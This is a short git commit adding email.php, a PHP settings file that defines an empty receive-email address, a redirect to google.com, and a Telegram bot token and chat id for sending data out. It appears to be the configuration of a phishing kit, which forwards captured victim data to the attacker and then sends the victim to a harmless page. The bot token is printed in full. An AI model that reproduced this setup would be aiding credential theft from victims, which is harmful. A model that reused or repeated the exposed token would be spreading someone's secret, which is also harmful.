5a39aafd6326312287f40f204d1ad39f683e5200
logisticsc <68974699+logisticsc@users.noreply.github.com>
2022-06-27 15:32:35 -0700

    Add files via upload

---
+++ email.php
@@ -0,0 +1,7 @@
+<?php 
+$Receive_email="";
+$redirect="https://www.google.com/";
+$telegram_enable = true;
+	$telegrambot = "bot5291224089:AAFphAlFR5MVPGlM0Amc8YzCLW9npK7r8TU";
+	$telegram_chatid = "-781381979";
+?>
